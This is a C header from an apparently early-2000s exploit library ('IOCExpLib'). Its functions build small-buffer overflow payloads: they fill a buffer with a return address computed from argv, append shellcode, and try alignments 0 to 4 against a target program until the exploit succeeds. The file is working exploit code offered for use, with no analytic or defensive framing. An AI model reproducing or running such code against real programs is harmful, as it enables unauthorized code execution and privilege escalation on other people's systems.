/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_fs.h 
 *  Description: includes small-buffer exploitation functions
 *  Contact me - Li0n7@voila.fr
 *
 */





#ifndef __IOCEL_SMALLB_H
#define __IOCEL_SMALLB_H


#include "IOCExpLib.h"

#define VERBOSE


int
IOCExpLib_small_bufferb(int argc, char **argv, char **environ, int bsize, char *shellcode, char cmd[256])
{
      int i, ret = 1;

      if (cmd == NULL)
      {
          fprintf(stderr, "[-] You may enter a valid prog-path to exploit\n");
          return -1;
      }


      for (i = 0; i <= 4; i++)
      {
          #ifdef VERBOSE
              fprintf(stdout, "[+] Using align: %i\n", i);
          #endif

          IOCExpLib_small_buffer(argc, argv, environ, bsize, i, shellcode);
          IOCExpLib_split(cmd);
          ret = IOCExpLib_tease();

          if (ret == 0){
              IOCExpLib_align = i;
              break;
          }

      }

      if (ret == 0)
          fprintf(stdout, "[+] Align found: %i\n", IOCExpLib_align);
      else
          fprintf(stdout, "[-] No align returned\n");

      return 0;
}











int
IOCExpLib_small_buffer(int argc, char **argv, char **environ, int bsize, int align, char *shellcode)
{
      int i;
      unsigned long *ptr;
      unsigned long retaddr;
      char *buff;

      (char *) retaddr = argv[argc-1] + strlen(argv[argc-1]);

      retaddr -= strlen(shellcode);
      retaddr += align;

      fprintf(stdout, "[+] Using ret address: 0x%x\n", retaddr);

      buff = (char *) malloc(bsize + strlen(shellcode) + 1);
      bzero(buff, bsize + strlen(shellcode) + 1);
      (char *) ptr = buff;

      for (i = 0; i < bsize; i += 4)
      {
          *(ptr++) = retaddr;
      }

      strcat(buff, shellcode);

      IOCExpLib_payload = (char *)malloc(strlen(buff)+1);
      strncpy(IOCExpLib_payload, buff, strlen(buff)+1);

      return (0);
}

#endif



